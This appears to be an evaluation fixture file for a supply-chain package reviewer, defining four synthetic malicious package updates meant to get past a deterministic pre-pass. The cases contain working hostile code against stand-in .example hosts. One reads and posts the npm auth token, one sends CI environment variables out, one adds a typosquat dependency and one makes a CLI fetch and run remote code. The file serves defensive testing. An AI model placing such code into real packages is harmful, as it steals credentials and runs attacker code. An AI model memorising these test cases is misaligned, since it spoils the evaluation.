// Attacks the deterministic pre-pass passes: no install script, no binding.gyp, no startup hook, so only the model
// reviewer can stop them. They measure the reviewer layer alone (the held-out set is all stopped by the pre-pass's
// install-script signal). Each is a synthetic reduction of a shape seen in supply-chain write-ups; every body is
// written for this eval and hosts use the reserved .example domain. Never use these to tune prompts.
import type { FileMap } from "../../src/prepass.ts";
import type { Case, Pkg } from "../2026-10-28-function-color-postinstall-hidden-download/cases.ts";

const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const pkg = (o: Record<string, unknown>) => JSON.stringify(o, null, 2) + "\n";
const lib = (name: string, version: string, manifest: Record<string, unknown>, rest: Record<string, string>): Pkg =>
  ({ name, version, files: files({ "package.json": pkg({ name, version, main: "index.js", ...manifest }), ...rest }) });

const BASE_INDEX = `exports.slug = (s) => s.toLowerCase().replace(/[^a-z0-9]+/g, "-");\n`;

export const GAP: Case[] = [
  {
    id: "gap-require-time-token-post", kind: "attack", expect: "hold",
    note: "no hooks: index.js reads the npm auth token from the user's .npmrc when required and posts it",
    base: [lib("slug-it", "2.1.0", {}, { "index.js": BASE_INDEX })],
    head: [lib("slug-it", "2.1.1", {}, { "index.js": BASE_INDEX + `try {\n  const t = require("fs").readFileSync(require("os").homedir() + "/.npmrc", "utf8").match(/_authToken=(.+)/);\n  if (t) require("https").request({ host: "metrics.slug-it.example", method: "POST", path: "/v1/usage" }).end(t[1]);\n} catch {}\n` })],
  },
  {
    id: "gap-ci-only-branch", kind: "attack", expect: "hold",
    note: "no hooks: a new branch runs only when CI is set and sends the environment to a new host",
    base: [lib("slug-it", "2.1.0", {}, { "index.js": BASE_INDEX })],
    head: [lib("slug-it", "2.2.0", {}, { "index.js": BASE_INDEX + `if (process.env.CI && process.env.GITHUB_ACTIONS) {\n  const body = JSON.stringify(process.env);\n  require("https").request({ host: "telemetry.slug-it.example", method: "POST", path: "/ci" }).end(body);\n}\n` })],
  },
  {
    id: "gap-new-dependency-lookalike", kind: "attack", expect: "hold",
    note: "no hooks in this package: it adds a dependency whose name is one letter off a popular package and requires it at load; the lookalike's own code is benign, so the expected outcome is a hold: a new dependency with a typosquat-shaped name goes to a human",
    base: [lib("slug-it", "2.1.0", {}, { "index.js": BASE_INDEX })],
    head: [lib("slug-it", "2.1.2", { dependencies: { "lodahs": "^4.17.0" } }, { "index.js": `const _ = require("lodahs");\nexports.slug = (s) => _.kebabCase(s);\n` }), lib("lodahs", "4.17.0", {}, { "index.js": `module.exports = { kebabCase: (s) => s.toLowerCase().replace(/[^a-z0-9]+/g, "-") };\n` })],
  },
  {
    id: "gap-bin-shim-rewrite", kind: "attack", expect: "hold",
    note: "no hooks: the existing command-line entry gains a line that downloads a script and runs it every time the command starts",
    base: [lib("slug-it", "2.1.0", { bin: { "slug-it": "cli.js" } }, { "index.js": BASE_INDEX, "cli.js": `#!/usr/bin/env node\nconsole.log(require("./index.js").slug(process.argv[2] || ""));\n` })],
    head: [lib("slug-it", "2.1.3", { bin: { "slug-it": "cli.js" } }, { "index.js": BASE_INDEX, "cli.js": `#!/usr/bin/env node\nrequire("https").get("https://cdn.slug-it.example/u.js", (r) => { let d = ""; r.on("data", (c) => (d += c)); r.on("end", () => new Function(d)()); });\nconsole.log(require("./index.js").slug(process.argv[2] || ""));\n` })],
  },
];
